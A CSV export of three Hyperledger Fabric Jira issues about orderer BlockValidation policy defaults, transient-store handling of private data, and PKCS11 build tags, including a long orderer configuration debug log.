Orderer ConfigGroup should validate BlockValidation policy is configured when adding policies,FAB-17515,44376,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,20/Feb/20 1:55 AM,27/Feb/20 1:35 AM,28/Oct/23 3:09 AM,26/Feb/20 6:23 AM,,,,,,,,,,v1.4.6,v2.0.1,v2.1.0,,,,,,,,,,,0,,,,,,"[https://github.com/hyperledger/fabric/blob/master/internal/configtxgen/encoder/encoder.go#L172-L177]

 

Currently when creating a new Orderer group, we don't validate if the BlockValidation policy is configured and instead default to an ImplicitMetaANYPolicy. We should verify the BlockValidation policy exists in the policy map and use that configured value instead of overwriting it to an ImplicitMetaANYPolicy.",,caod,denyeart,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019bn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,denyeart,wlahti,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Feb/20 2:33 AM;caod;master: [https://github.com/hyperledger/fabric/pull/694];;;","20/Feb/20 4:23 AM;wlahti;release-1.4: [https://github.com/hyperledger/fabric/pull/697];;;","27/Feb/20 1:35 AM;denyeart;https://github.com/hyperledger/fabric/pull/731;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Peer that is not a member of a collection but endorses a transaction, should not store private data in transient store",FAB-17516,44380,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,20/Feb/20 11:54 PM,09/Nov/20 11:15 PM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.1.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"If a peer that is not a member of a collection endorses a transaction that writes to the collection, the peer should not store the collection private data in its transient store.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0ipi",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Components compiled with PKCS11 GOTAGS unable to use SW,FAB-17517,44381,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,ahmedsajid,ahmedsajid,ahmedsajid,21/Feb/20 3:34 AM,30/Mar/20 6:23 AM,28/Oct/23 3:09 AM,11/Mar/20 9:30 PM,v1.4.1,v1.4.2,v1.4.3,v1.4.4,v1.4.5,,,,,v1.4.7,v2.0.2,v2.1.0,,fabric-crypto,,,,,,,,,0,bccsp,fabric,fabric-ca,fabric-orderer,fabric-peer,"Looks like when any of the Fabric components are complied with GO_TAGS=""pkcs11"", the code tries to initialize PKCS11 even with BCCSP DEFAULT=SW.

The only way around is to ensure that orderer.yaml/core.yaml/fabric-ca-*.yaml do not have PKCS11 section defined.
{code:java}
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 001 Found map[interface{}]interface{} value for fileledger
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 002 Unmarshal JSON: value cannot be unmarshalled: invalid character '/' looking for beginning of value
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 003 Found real value for fileledger.Location setting to string /var/hyperledger/production/orderer
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 004 Unmarshal JSON: value cannot be unmarshalled: invalid character 'h' looking for beginning of value
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 005 Found real value for fileledger.Prefix setting to string hyperledger-fabric-ordererledger
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 006 Found map[interface{}]interface{} value for ramledger
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 007 Unmarshal JSON: value is not a string: 1000
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 008 Found real value for ramledger.HistorySize setting to int 1000
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 009 Found map[interface{}]interface{} value for kafka
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 00a Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 00b Found real value for kafka.Version setting to <nil> <nil>
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 00c Found map[string]interface{} value for kafka.Retry
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 00d Unmarshal JSON: value cannot be unmarshalled: invalid character 'm' after top-level value
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 00e Found real value for kafka.Retry.ShortTotal setting to string 10m
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 00f Unmarshal JSON: value cannot be unmarshalled: invalid character 'm' after top-level value
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 010 Found real value for kafka.Retry.LongInterval setting to string 5m
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 011 Unmarshal JSON: value cannot be unmarshalled: invalid character 'h' after top-level value
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 012 Found real value for kafka.Retry.LongTotal setting to string 12h
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 013 Found map[string]interface{} value for kafka.Retry.NetworkTimeouts
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 014 Unmarshal JSON: value cannot be unmarshalled: invalid character 's' after top-level value
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 015 Found real value for kafka.Retry.NetworkTimeouts.DialTimeout setting to string 10s
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 016 Unmarshal JSON: value cannot be unmarshalled: invalid character 's' after top-level value
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 017 Found real value for kafka.Retry.NetworkTimeouts.ReadTimeout setting to string 10s
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 018 Unmarshal JSON: value cannot be unmarshalled: invalid character 's' after top-level value
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 019 Found real value for kafka.Retry.NetworkTimeouts.WriteTimeout setting to string 10s
2020-02-20 18:14:25.791 UTC [viperutil] getKeysRecursively -> DEBU 01a Found map[string]interface{} value for kafka.Retry.Metadata
2020-02-20 18:14:25.791 UTC [viperutil] unmarshalJSON -> DEBU 01b Unmarshal JSON: value cannot be unmarshalled: invalid character 'm' after top-level value
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 01c Found real value for kafka.Retry.Metadata.RetryBackoff setting to string 250ms
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 01d Unmarshal JSON: value is not a string: 3
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 01e Found real value for kafka.Retry.Metadata.RetryMax setting to int 3
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 01f Found map[string]interface{} value for kafka.Retry.Producer
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 020 Unmarshal JSON: value cannot be unmarshalled: invalid character 'm' after top-level value
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 021 Found real value for kafka.Retry.Producer.RetryBackoff setting to string 100ms
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 022 Unmarshal JSON: value is not a string: 3
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 023 Found real value for kafka.Retry.Producer.RetryMax setting to int 3
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 024 Found map[string]interface{} value for kafka.Retry.Consumer
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 025 Unmarshal JSON: value cannot be unmarshalled: invalid character 's' after top-level value
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 026 Found real value for kafka.Retry.Consumer.RetryBackoff setting to string 2s
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 027 Unmarshal JSON: value cannot be unmarshalled: invalid character 's' after top-level value
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 028 Found real value for kafka.Retry.ShortInterval setting to string 5s
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 029 Found map[string]interface{} value for kafka.Topic
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 02a Unmarshal JSON: value is not a string: 3
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 02b Found real value for kafka.Topic.ReplicationFactor setting to int 3
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 02c Unmarshal JSON: value is not a string: false
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 02d Found real value for kafka.Verbose setting to bool false
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 02e Found map[string]interface{} value for kafka.TLS
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 02f Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 030 Found real value for kafka.TLS.Certificate setting to <nil> <nil>
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 031 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 032 Found real value for kafka.TLS.RootCAs setting to <nil> <nil>
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 033 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 034 Found real value for kafka.TLS.ClientAuthRequired setting to <nil> <nil>
2020-02-20 18:14:25.792 UTC [viperutil] unmarshalJSON -> DEBU 035 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.792 UTC [viperutil] getKeysRecursively -> DEBU 036 Found real value for kafka.TLS.ClientRootCAs setting to <nil> <nil>
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 037 Unmarshal JSON: value is not a string: false
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 038 Found real value for kafka.TLS.Enabled setting to bool false
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 039 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 03a Found real value for kafka.TLS.PrivateKey setting to <nil> <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 03b Found map[string]interface{} value for kafka.SASLPlain
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 03c Unmarshal JSON: value is not a string: false
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 03d Found real value for kafka.SASLPlain.Enabled setting to bool false
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 03e Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 03f Found real value for kafka.SASLPlain.User setting to <nil> <nil>
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 040 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 041 Found real value for kafka.SASLPlain.Password setting to <nil> <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 042 Found map[interface{}]interface{} value for debug
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 043 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 044 Found real value for debug.DeliverTraceDir setting to <nil> <nil>
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 045 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 046 Found real value for debug.BroadcastTraceDir setting to <nil> <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 047 Found map[interface{}]interface{} value for operations
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 048 Unmarshal JSON: value cannot be unmarshalled: invalid character '.' after top-level value
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 049 Found real value for operations.ListenAddress setting to string 127.0.0.1:8443
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 04a Found map[string]interface{} value for operations.TLS
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 04b Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 04c Found real value for operations.TLS.Certificate setting to <nil> <nil>
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 04d Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 04e Found real value for operations.TLS.PrivateKey setting to <nil> <nil>
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 04f Unmarshal JSON: value is not a string: false
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 050 Found real value for operations.TLS.ClientAuthRequired setting to bool false
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 051 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 052 Found real value for operations.TLS.RootCAs setting to <nil> <nil>
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 053 Unmarshal JSON: value is not a string: []
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 054 Found real value for operations.TLS.ClientRootCAs setting to []interface {} []
2020-02-20 18:14:25.793 UTC [viperutil] unmarshalJSON -> DEBU 055 Unmarshal JSON: value is not a string: false
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 056 Found real value for operations.TLS.Enabled setting to bool false
2020-02-20 18:14:25.793 UTC [viperutil] getKeysRecursively -> DEBU 057 Found map[interface{}]interface{} value for metrics
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 058 Unmarshal JSON: value cannot be unmarshalled: invalid character 'd' looking for beginning of value
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 059 Found real value for metrics.Provider setting to string disabled
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 05a Found map[string]interface{} value for metrics.Statsd
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 05b Unmarshal JSON: value cannot be unmarshalled: invalid character 'u' looking for beginning of value
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 05c Found real value for metrics.Statsd.Network setting to string udp
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 05d Unmarshal JSON: value cannot be unmarshalled: invalid character '.' after top-level value
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 05e Found real value for metrics.Statsd.Address setting to string 127.0.0.1:8125
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 05f Unmarshal JSON: value cannot be unmarshalled: invalid character 's' after top-level value
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 060 Found real value for metrics.Statsd.WriteInterval setting to string 30s
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 061 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 062 Found real value for metrics.Statsd.Prefix setting to <nil> <nil>
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 063 Found map[interface{}]interface{} value for consensus
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 064 Unmarshal JSON: value cannot be unmarshalled: invalid character '/' looking for beginning of value
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 065 Found real value for consensus.WALDir setting to string /var/hyperledger/production/orderer/etcdraft/wal
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 066 Unmarshal JSON: value cannot be unmarshalled: invalid character '/' looking for beginning of value
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 067 Found real value for consensus.SnapDir setting to string /var/hyperledger/production/orderer/etcdraft/snapshot
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 068 Found map[interface{}]interface{} value for general
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 069 Found map[string]interface{} value for general.BCCSP
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 06a Unmarshal JSON: value cannot be unmarshalled: invalid character 'S' looking for beginning of value
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 06b Found real value for general.BCCSP.Default setting to string SW
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 06c Found map[string]interface{} value for general.BCCSP.SW
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 06d Found map[string]interface{} value for general.BCCSP.SW.FileKeyStore
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 06e Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 06f Found real value for general.BCCSP.SW.FileKeyStore.KeyStore setting to <nil> <nil>
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 070 Unmarshal JSON: value cannot be unmarshalled: invalid character 'S' looking for beginning of value
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 071 Found real value for general.BCCSP.SW.Hash setting to string SHA2
2020-02-20 18:14:25.794 UTC [viperutil] unmarshalJSON -> DEBU 072 Unmarshal JSON: value is not a string: 256
2020-02-20 18:14:25.794 UTC [viperutil] getKeysRecursively -> DEBU 073 Found real value for general.BCCSP.SW.Security setting to int 256
2020-02-20 18:14:25.795 UTC [viperutil] getKeysRecursively -> DEBU 074 Found map[string]interface{} value for general.BCCSP.PKCS11
2020-02-20 18:14:25.795 UTC [viperutil] getKeysRecursively -> DEBU 075 Found map[string]interface{} value for general.BCCSP.PKCS11.FileKeyStore
2020-02-20 18:14:25.795 UTC [viperutil] unmarshalJSON -> DEBU 076 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.795 UTC [viperutil] getKeysRecursively -> DEBU 077 Found real value for general.BCCSP.PKCS11.FileKeyStore.KeyStore setting to <nil> <nil>
2020-02-20 18:14:25.795 UTC [viperutil] unmarshalJSON -> DEBU 078 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.795 UTC [viperutil] getKeysRecursively -> DEBU 079 Found real value for general.BCCSP.PKCS11.Library setting to <nil> <nil>
2020-02-20 18:14:25.795 UTC [viperutil] unmarshalJSON -> DEBU 07a Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.795 UTC [viperutil] getKeysRecursively -> DEBU 07b Found real value for general.BCCSP.PKCS11.Label setting to <nil> <nil>
2020-02-20 18:14:25.795 UTC [viperutil] unmarshalJSON -> DEBU 07c Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.795 UTC [viperutil] getKeysRecursively -> DEBU 07d Found real value for general.BCCSP.PKCS11.Pin setting to <nil> <nil>
2020-02-20 18:14:25.795 UTC [viperutil] unmarshalJSON -> DEBU 07e Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.795 UTC [viperutil] getKeysRecursively -> DEBU 07f Found real value for general.BCCSP.PKCS11.Hash setting to <nil> <nil>
2020-02-20 18:14:25.795 UTC [viperutil] unmarshalJSON -> DEBU 080 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.795 UTC [viperutil] getKeysRecursively -> DEBU 081 Found real value for general.BCCSP.PKCS11.Security setting to <nil> <nil>
2020-02-20 18:14:25.795 UTC [viperutil] unmarshalJSON -> DEBU 082 Unmarshal JSON: value cannot be unmarshalled: invalid character '.' after top-level value
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 083 Found real value for general.ListenAddress setting to string 127.0.0.1
2020-02-20 18:14:25.796 UTC [viperutil] unmarshalJSON -> DEBU 084 Unmarshal JSON: value cannot be unmarshalled: invalid character 'm' looking for beginning of value
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 085 Found real value for general.LocalMSPDir setting to string msp
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 086 Found map[string]interface{} value for general.Profile
2020-02-20 18:14:25.796 UTC [viperutil] unmarshalJSON -> DEBU 087 Unmarshal JSON: value is not a string: false
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 088 Found real value for general.Profile.Enabled setting to bool false
2020-02-20 18:14:25.796 UTC [viperutil] unmarshalJSON -> DEBU 089 Unmarshal JSON: value cannot be unmarshalled: invalid character '.' after top-level value
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 08a Found real value for general.Profile.Address setting to string 0.0.0.0:6060
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 08b Found map[string]interface{} value for general.Authentication
2020-02-20 18:14:25.796 UTC [viperutil] unmarshalJSON -> DEBU 08c Unmarshal JSON: value cannot be unmarshalled: invalid character 'm' after top-level value
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 08d Found real value for general.Authentication.TimeWindow setting to string 15m
2020-02-20 18:14:25.796 UTC [viperutil] unmarshalJSON -> DEBU 08e Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 08f Found real value for general.Authentication.NoExpirationChecks setting to <nil> <nil>
2020-02-20 18:14:25.796 UTC [viperutil] unmarshalJSON -> DEBU 090 Unmarshal JSON: value cannot be unmarshalled: invalid character 'S' looking for beginning of value
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 091 Found real value for general.LocalMSPID setting to string SampleOrg
2020-02-20 18:14:25.796 UTC [viperutil] unmarshalJSON -> DEBU 092 Unmarshal JSON: value cannot be unmarshalled: invalid character 'p' looking for beginning of value
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 093 Found real value for general.GenesisMethod setting to string provisional
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 094 Found map[string]interface{} value for general.Keepalive
2020-02-20 18:14:25.796 UTC [viperutil] unmarshalJSON -> DEBU 095 Unmarshal JSON: value cannot be unmarshalled: invalid character 's' after top-level value
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 096 Found real value for general.Keepalive.ServerTimeout setting to string 20s
2020-02-20 18:14:25.796 UTC [viperutil] unmarshalJSON -> DEBU 097 Unmarshal JSON: value cannot be unmarshalled: invalid character 's' after top-level value
2020-02-20 18:14:25.796 UTC [viperutil] getKeysRecursively -> DEBU 098 Found real value for general.Keepalive.ServerMinInterval setting to string 60s
2020-02-20 18:14:25.796 UTC [viperutil] unmarshalJSON -> DEBU 099 Unmarshal JSON: value cannot be unmarshalled: invalid character 's' after top-level value
2020-02-20 18:14:25.797 UTC [viperutil] getKeysRecursively -> DEBU 09a Found real value for general.Keepalive.ServerInterval setting to string 7200s
2020-02-20 18:14:25.797 UTC [viperutil] unmarshalJSON -> DEBU 09b Unmarshal JSON: value cannot be unmarshalled: invalid character 'S' looking for beginning of value
2020-02-20 18:14:25.797 UTC [viperutil] getKeysRecursively -> DEBU 09c Found real value for general.GenesisProfile setting to string SampleInsecureSolo
2020-02-20 18:14:25.797 UTC [viperutil] unmarshalJSON -> DEBU 09d Unmarshal JSON: value cannot be unmarshalled: invalid character 'g' looking for beginning of value
2020-02-20 18:14:25.797 UTC [viperutil] getKeysRecursively -> DEBU 09e Found real value for general.GenesisFile setting to string genesisblock
2020-02-20 18:14:25.797 UTC [viperutil] unmarshalJSON -> DEBU 09f Unmarshal JSON: value cannot be unmarshalled: invalid character 'i' in literal false (expecting 'a')
2020-02-20 18:14:25.797 UTC [viperutil] getKeysRecursively -> DEBU 0a0 Found real value for general.LedgerType setting to string file
2020-02-20 18:14:25.797 UTC [viperutil] unmarshalJSON -> DEBU 0a1 Unmarshal JSON: value is not a string: 7050
2020-02-20 18:14:25.797 UTC [viperutil] getKeysRecursively -> DEBU 0a2 Found real value for general.ListenPort setting to int 7050
2020-02-20 18:14:25.797 UTC [viperutil] getKeysRecursively -> DEBU 0a3 Found map[string]interface{} value for general.Cluster
2020-02-20 18:14:25.797 UTC [viperutil] unmarshalJSON -> DEBU 0a4 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.797 UTC [viperutil] getKeysRecursively -> DEBU 0a5 Found real value for general.Cluster.ServerCertificate setting to <nil> <nil>
2020-02-20 18:14:25.797 UTC [viperutil] unmarshalJSON -> DEBU 0a6 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.797 UTC [viperutil] getKeysRecursively -> DEBU 0a7 Found real value for general.Cluster.RPCTimeout setting to <nil> <nil>
2020-02-20 18:14:25.797 UTC [viperutil] unmarshalJSON -> DEBU 0a8 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.797 UTC [viperutil] getKeysRecursively -> DEBU 0a9 Found real value for general.Cluster.ReplicationMaxRetries setting to <nil> <nil>
2020-02-20 18:14:25.797 UTC [viperutil] unmarshalJSON -> DEBU 0aa Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.797 UTC [viperutil] getKeysRecursively -> DEBU 0ab Found real value for general.Cluster.TLSHandshakeTimeShift setting to <nil> <nil>
2020-02-20 18:14:25.798 UTC [viperutil] unmarshalJSON -> DEBU 0ac Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.798 UTC [viperutil] getKeysRecursively -> DEBU 0ad Found real value for general.Cluster.ListenAddress setting to <nil> <nil>
2020-02-20 18:14:25.798 UTC [viperutil] unmarshalJSON -> DEBU 0ae Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.798 UTC [viperutil] getKeysRecursively -> DEBU 0af Found real value for general.Cluster.RootCAs setting to <nil> <nil>
2020-02-20 18:14:25.798 UTC [viperutil] unmarshalJSON -> DEBU 0b0 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.798 UTC [viperutil] getKeysRecursively -> DEBU 0b1 Found real value for general.Cluster.ReplicationPullTimeout setting to <nil> <nil>
2020-02-20 18:14:25.798 UTC [viperutil] unmarshalJSON -> DEBU 0b2 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.798 UTC [viperutil] getKeysRecursively -> DEBU 0b3 Found real value for general.Cluster.ReplicationRetryTimeout setting to <nil> <nil>
2020-02-20 18:14:25.798 UTC [viperutil] unmarshalJSON -> DEBU 0b4 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.798 UTC [viperutil] getKeysRecursively -> DEBU 0b5 Found real value for general.Cluster.ClientCertificate setting to <nil> <nil>
2020-02-20 18:14:25.798 UTC [viperutil] unmarshalJSON -> DEBU 0b6 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.798 UTC [viperutil] getKeysRecursively -> DEBU 0b7 Found real value for general.Cluster.ClientPrivateKey setting to <nil> <nil>
2020-02-20 18:14:25.798 UTC [viperutil] unmarshalJSON -> DEBU 0b8 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.798 UTC [viperutil] getKeysRecursively -> DEBU 0b9 Found real value for general.Cluster.ServerPrivateKey setting to <nil> <nil>
2020-02-20 18:14:25.799 UTC [viperutil] unmarshalJSON -> DEBU 0ba Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.799 UTC [viperutil] getKeysRecursively -> DEBU 0bb Found real value for general.Cluster.ReplicationBufferSize setting to <nil> <nil>
2020-02-20 18:14:25.799 UTC [viperutil] unmarshalJSON -> DEBU 0bc Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.799 UTC [viperutil] getKeysRecursively -> DEBU 0bd Found real value for general.Cluster.ReplicationBackgroundRefreshInterval setting to <nil> <nil>
2020-02-20 18:14:25.799 UTC [viperutil] unmarshalJSON -> DEBU 0be Unmarshal JSON: value is not a string: <nil>
